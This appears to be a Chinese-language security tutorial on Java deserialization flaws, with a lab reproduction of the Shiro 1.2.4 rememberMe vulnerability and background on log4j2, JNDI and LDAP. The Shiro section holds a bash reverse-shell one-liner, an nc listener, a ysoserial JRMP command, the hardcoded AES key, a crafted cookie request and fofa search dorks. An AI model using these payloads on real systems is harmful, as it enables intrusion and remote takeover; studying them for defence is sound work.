<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120161615273.png" alt="image-20221120161615273" style="zoom:67%;" />
<p>主要应用场景：</p>
<p>1、持久化内存数据</p>
<p>2、网络传输对象</p>
<p>3、远程方法调用 (RMI)</p>
<p>java 可以序列化成字节流，也可以序列化为 json 格式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestToFile</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        Person obj= <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;wuya&quot;</span>, <span class="number">666</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;D:/wuya.xxx&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span>  <span class="variable">outStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filePath));</span><br><span class="line">        outStream.writeObject(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ObjectInputStream</span>  <span class="variable">inStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath));</span><br><span class="line">        <span class="comment">// readObject 方法</span></span><br><span class="line">        <span class="type">Person</span> <span class="variable">readObject</span> <span class="operator">=</span> (Person)inStream.readObject();</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化后：name=&quot;</span>+readObject.name +<span class="string">&quot;,age=&quot;</span>+readObject.age);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221120163923386.png" alt="image-20221120163923386"></p>
<p>很明显，序列化后的字节流的开头为 aced</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvc2VyaWFsVE9DLmh0bWw=">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/serialTOC.html</span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm9yYWNsZS5jb20vamF2YXNlLzgvZG9jcy9wbGF0Zm9ybS9zZXJpYWxpemF0aW9uL3NwZWMvcHJvdG9jb2wuaHRtbCNhMTAyNTg=">https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html#a10258</span></p>
<p>详细格式如上</p>
<p>如果两个包不在一个路径下，需要引入依赖</p>
<blockquote>
<p>序列化</p>
<p>java.io.ObjectOutputStream.writeObject()</p>
<p>反序列化</p>
<p>java.io.ObjectInputStream.readObject()</p>
</blockquote>
<p>如果在序列化的时候 override 了 readobject，那么在反序列化的时候就不会再执行 OOI 的代码</p>
<p>如果此时重写的代码中含有可控参数，那么会造成漏洞</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeClass</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写readObject()方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//执行默认的readObject()方法</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        <span class="comment">//执行命令</span></span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnsafeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">UnsafeClass</span> <span class="variable">Unsafe</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnsafeClass</span>();</span><br><span class="line">        Unsafe.name = <span class="string">&quot;hacked by wuya&quot;</span>;</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;D:/wuya.yyy&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(Unsafe);</span><br><span class="line">        os.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从 反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;D:/wuya.yyy&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">UnsafeClass</span> <span class="variable">objectFromDisk</span> <span class="operator">=</span> (UnsafeClass) ois.readObject();</span><br><span class="line">        System.out.println(objectFromDisk.name);</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>那么我们要利用这个漏洞，就需要找到一些重写了 readobject 的类，同时 readobject 类中可以接受参数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">package sun.reflect.annotation;</span><br><span class="line">AnnotationInvocationHandler</span><br><span class="line"></span><br><span class="line">package javax.management;</span><br><span class="line">BadAttributeValueExpException</span><br></pre></td></tr></table></figure>
<h3 id="shiro-124反序列化"><a class="markdownIt-Anchor" href="#shiro-124反序列化">#</a> Shiro 1.2.4 反序列化</h3>
<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro 框架直观、易用，同时也能提供健壮的安全性。</p>
<ol>
<li>rememberMe 生成过程：序列化→AES 加密→Base64 编码→生成 rememberMe 内容。</li>
<li>服务端接收 Cookie 值时：检索 Cookie 中的 rememberMe 内容→Base64 解密→AES 解密 (加密密钥硬编码)→反序列化 (未做处理)。</li>
</ol>
<p>Apache Shiro 默认使用了 CookieRememberMeManager，其处理 Cookie 的流程：得到 rememberMe 的 Cookie 值→Base64 解码→AES 解密→反序列化。然而 AES 的密钥是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的 RCE 漏洞。</p>
<p>关键因素：AES 的加密密钥在 Shiro 的 1.2.4 之前版本中使用的是硬编码：kPH+bIxk5D2deZiIxcaaaA==，只要找到密钥后就可以通过构造恶意的序列化对象进行编码，加密，然后作为 Cookie 加密发送，服务端接收后会解密并触发反序列化漏洞。在 1.2.4 之后，ASE 秘钥就不为默认了，需要获取到 Key 才可以进行渗透</p>
<p>在不选择 remember-me 的时候该字段为 delete me，勾选后为刚刚加密的数据</p>
<p><span class="exturl" data-url="aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzL3NoaXJvL0NWRS0yMDE2LTQ0Mzcv">Vulhub - Docker-Compose file for vulnerability environment</span></p>
<p>登录过程</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183841649.png" alt="image-20221122183841649"></p>
<p>验证过程</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122183907917.png" alt="image-20221122183907917"></p>
<p>JRMP 全称为 Java Remote Method Protocol，也就是 Java 远程方法协议</p>
<p>利用方式 1</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190553667.png" alt="image-20221122190553667"></p>
<p>利用方式 2</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122190635789.png" alt="image-20221122190635789"></p>
<p>漏洞特征</p>
<p>set-cookie 是否存在 remeberMe=deleteMe</p>
<p>fofa dork</p>
<p>header= “rememberme=deleteMe” 、header= “shiroCookie”</p>
<p>检测工具</p>
<p>1、shiro_tool.jar 纯字符版</p>
<p>2、ShiroExploitV2.51</p>
<p>3、shiro_attack-v2.0.jar</p>
<p>硬编码的 aeskey</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193315250.png" alt="image-20221122193315250"></p>
<p>复现：</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122193640835.png" alt="image-20221122193640835"></p>
<p>1. 攻击机监听 nc -lvvp 7777</p>
<p>2. 生成 payload，并编码</p>
<p>bash -i &gt;&amp; /dev/tcp/192.168.142.132/7777 0&gt;&amp;1</p>
<p>工具：<span class="exturl" data-url="aHR0cHM6Ly9hcmVzLXguY29tL3Rvb2xzL3J1bnRpbWUtZXhlYy8=">https://ares-x.com/tools/runtime-exec/</span></p>
<p>结果：</p>
<p bash,-i="">bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|</p>
<p>3. 攻击机连接 JRMP</p>
<p>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections5 “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Mi4xMzIvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}”</p>
<p>4. 生成 cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 shiro.py 192.168.142.132:8888</span><br><span class="line">结果：</span><br><span class="line">rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w==</span><br></pre></td></tr></table></figure>
<p>5. 发送 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /doLogin HTTP/1.1</span><br><span class="line">Host: 192.168.142.128:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 47</span><br><span class="line">Origin: http://192.168.142.128:8080</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.142.128:8080/doLogin</span><br><span class="line">Cookie:</span><br><span class="line">JSESSIONID=BE2042921ED0A1E58436F6FBD5654581;rememberMe=+DcRVRC3TxGKeuGHa4TZSWqqLtQGyPvE0mjicSb4nm6nUdC6PwNxo6ZgbQLuHr8wq3ECYQVLqKXaECtmKQhW91hbrn3XgJzn3XRUgNEciP3dQpQcOO1ID+vsns3qmyd6SMva5e+cX7z74AwVAK2i0cwc/AmnVUV/oCdA9nHPcb6b5EH23bkrLuafb5Ij7e6t+X1pZunOUFbquQqrBCW4D+hmUS+g93brv5cpLDmR5DWkh7yqWyTXMWKzZqRP0iW/x1gOFVZ3wPv2CYZhvQlH3jpk7nxq5gf5rfCgQ7T8R7OJ66zQc92gx0kbInRJ/QT3v19RF3Jn/q7fBGyX2/LDDdjPzd4DYBMj3CgH3Cx4FuElMv4364VTknFZqVj4gMsfGS2OA9NZ/2jVIFhTdhvU3w== </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">username=a&amp;password=b&amp;rememberme=remember-me</span><br></pre></td></tr></table></figure>
<p>修复和防御</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、升级Apache Shiro到最版本</span><br><span class="line">2、部署安全产品</span><br></pre></td></tr></table></figure>
<h3 id="log4j2-反序列化"><a class="markdownIt-Anchor" href="#log4j2-反序列化">#</a> log4j2 反序列化</h3>
<p>Log for Java，Apache 的开源日志记录组件，使用非常广泛</p>
<blockquote>
<p>使用方法：</p>
<p>1、pom 引入依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;com.unboundid&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;6.0.3&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;mysql&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;5.1.35&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<p>2、获得 logger 实例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">public class Log4JTest &#123;</span><br><span class="line">    private static final Logger logger = LogManager.getLogger(Log4JTest.class);</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;wuya 666&quot;);</span><br><span class="line"></span><br><span class="line">        // logger.error(&quot;wuya 666&quot;);</span><br><span class="line">        //logger.error(&quot;$&#123;java:runtime&#125; - $&#123;java:vm&#125; - $&#123;java:os&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>3、其中 Log4j 包括的日志等级层级分别为：ALL &lt; DEBUG &lt; INFO &lt; WARN &lt; ERROR &lt; FATAL &lt; OFF。</p>
<p>在默认情况下，会输出 WARN/ERROR/FATAL 等级的日志。可以使用配置文件更改日志输出等级：</p>
<p>log4j2 日志与 print 的区别</p>
<p>可以输出到文件</p>
<p>可以输出不同类型级别的日志</p>
<p>上线时不需要修改，不需要删除 println</p>
<p>便于分析追溯切割</p>
</blockquote>
<p>LDAP</p>
<p>轻量级目录访问协议</p>
<p>目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好象 Linux/Unix 系统中的文件目录一样。</p>
<p>可以通过 LDAP 协议，传一个 name 进去，就能获取到数据。</p>
<p>LDAP 在统一身份认证领域比较多，比如 Windows 的域环境</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140137271.png" alt="image-20221126140137271"></p>
<p>LDAP 的树状结构组织数据</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221125195016231.png" alt="image-20221125195016231"></p>
<p>LDAP 适合 C/S 架构，SSO (单点登录) 适合 B/S 架构</p>
<p>JNDI</p>
<p>Java 命名和目录接口（命名服务接口）</p>
<p>用于根据名字找到位置、服务、信息、资源、对象等 K V</p>
<p>可以理解为有一个类似于字典的数据源，你可以通过 JNDI 接口，传一个 name 进去，就能获取到对象了。</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/bfd6e2fc555bc73870672c5c8fe5e548.png" alt="图片"></p>
<p>JNDI 基本操作：</p>
<p>1、发布服务（名字和资源的映射）： bind ()</p>
<p>2、用名字查找资源： lookup ()</p>
<p>采用 JNDI 方式连接数据库，我们无需在关注数据库的连接参数，当参数改变，我们的调用代码不发生改变</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public void jndiConnet() throws SQLException, NamingException &#123;</span><br><span class="line">        Context ctx=new InitialContext();</span><br><span class="line">        Object datasourceRef=ctx.lookup(&quot;java:jdbc/mydatasource&quot;);</span><br><span class="line">        DataSource ds=(DataSource)datasourceRef;</span><br><span class="line">        Connection conn=ds.getConnection();</span><br><span class="line"></span><br><span class="line">        Statement st=conn.createStatement();</span><br><span class="line">        ResultSet rs=st.executeQuery(&quot;select * from users where id =1 &quot;);</span><br><span class="line">        while(rs.next())&#123;</span><br><span class="line">            System.out.println(</span><br><span class="line">                    &quot;name:&quot;+rs.getString(&quot;name&quot;)+&quot;\n&quot;</span><br><span class="line">                            +&quot;password:&quot;+rs.getString(&quot;password&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        rs.close();</span><br><span class="line">        st.close();</span><br><span class="line">        conn.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140836409.png" alt="image-20221126140836409"></p>
<p>JNDI 可以访问：</p>
<p>LDAP 目录服务、RMI 远程方法调用、DNS、XNam 、Novell 目录服务、 CORBA 对象服务、文件系统、WindowsXP/2000/NT/Me/9x 的注册表、DSMLv1&amp;v2、NIS</p>
<p>而这些通过 lookup 方法完成</p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126140957355.png" alt="image-20221126140957355"></p>
<p>lookup</p>
<p>假如现在想要通过日志输出一个 Java 对象，但这个对象不在程序中，而是在其他地方，比如可能在某个文件中，甚至可能在网络上的某个地方，可以使用 lookup 查找</p>
<p>lookup 相当于是一个接口，具体去哪里查找，怎么查找，就需要编写具体的模块去实现了，类似于面向对象编程中多态那意思。</p>
<p>JNDI 可以使用 lookup 查找 docker,java,jndi,log4j 等内容</p>
<p>JNDI 和 LDAP 关系</p>
<p jndi:ldap:wuya.com:5678test="">$</p>
<p>通过名字，查找（lookup）LDAP 的服务，获取 LDAP 中存储的数据</p>
<p>下面举了个例子，通过 JNDI 查找 LDAP 中的 UID 和 DN</p>
<p>server:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class LDAPSeriServer &#123;</span><br><span class="line"></span><br><span class="line">    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;</span><br><span class="line">    public static void main(String[] args) throws IOException &#123;</span><br><span class="line">        int port = 7389;</span><br><span class="line">        try &#123;</span><br><span class="line">            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(new InMemoryListenerConfig(</span><br><span class="line">                    &quot;listen&quot;, //$NON-NLS-1$</span><br><span class="line">                    InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line">            config.setSchema(null);</span><br><span class="line">            config.setEnforceAttributeSyntaxCompliance(false);</span><br><span class="line">            config.setEnforceSingleStructuralObjectClass(false);</span><br><span class="line">            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);</span><br><span class="line">            ds.add(&quot;dn: &quot; + &quot;dc=example,dc=com&quot;, &quot;objectClass: top&quot;, &quot;objectclass: domain&quot;);</span><br><span class="line">            ds.add(&quot;dn: &quot; + &quot;ou=employees,dc=example,dc=com&quot;, &quot;objectClass: organizationalUnit&quot;, &quot;objectClass: top&quot;);</span><br><span class="line">            ds.add(&quot;dn: &quot; + &quot;uid=wuya,ou=employees,dc=example,dc=com&quot;, &quot;objectClass: ExportObject&quot;);</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port); //$NON-NLS-1$</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>client</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public class JNDIClient &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws NamingException &#123;</span><br><span class="line">        Hashtable&lt;String, Object&gt; env = new Hashtable&lt;String, Object&gt;();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span><br><span class="line">        env.put(Context.PROVIDER_URL, &quot;ldap://localhost:7389/dc=example,dc=com&quot;);</span><br><span class="line">        //env.put(Context.SECURITY_AUTHENTICATION, &quot;simple&quot;);</span><br><span class="line">        //env.put(Context.SECURITY_PRINCIPAL, &quot;cn=admin,dc=wuya,dc=net&quot;);</span><br><span class="line">        //env.put(Context.SECURITY_CREDENTIALS, &quot;wuya&quot;);</span><br><span class="line">        DirContext ctx = new InitialDirContext(env);</span><br><span class="line">        SearchControls searchControls = new SearchControls();</span><br><span class="line">        searchControls.setSearchScope(SearchControls.SUBTREE_SCOPE);</span><br><span class="line">        searchControls.setCountLimit(10);</span><br><span class="line">        NamingEnumeration&lt;SearchResult&gt; namingEnumeration =</span><br><span class="line">                ctx.search(&quot;&quot;, &quot;(uid=*)&quot;, new Object[]&#123;&#125;, searchControls);</span><br><span class="line">        //通过名称查找远程对象，假设远程服务器已经将一个远程对象与名称绑定了</span><br><span class="line">        ctx.lookup(&quot;ldap://localhost:7389/ou=employees,dc=example,dc=com&quot;);</span><br><span class="line">        while (namingEnumeration.hasMore()) &#123;</span><br><span class="line">            SearchResult sr = namingEnumeration.next();</span><br><span class="line">            System.out.println(&quot;DN: &quot; + sr.getName());</span><br><span class="line">            System.out.println(sr.getAttributes().get(&quot;uid&quot;));</span><br><span class="line">            //System.out.println(&quot;Password:&quot; + new String((byte[]) sr.getAttributes().get(&quot;userPassword&quot;).get()));</span><br><span class="line">        &#125;</span><br><span class="line">        ctx.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>JNDI 命名引用（Naming Reference）</p>
<p>1、在 LDAP 里面可以存储一个外部的资源，叫做命名引用，对应 Reference 类比如远程 HTTP 服务的一个.class 文件</p>
<p>2、如果 JNDI 客户端，在 LDAP 服务中找不到对应的资源 (test)，就去指定的地址请求。如果是命名引用，会把这个文件下载到本地</p>
<p>3、如果下载的.class 文件包含无参构造函数或静态方法块，加载的时候会自动执行</p>
<p>下面还有个例子，比如我们现在的 naming reference 是 Exploit，那么在 LDAP 服务中找不到对应的资源，会把刚刚的 class 下载到本地</p>
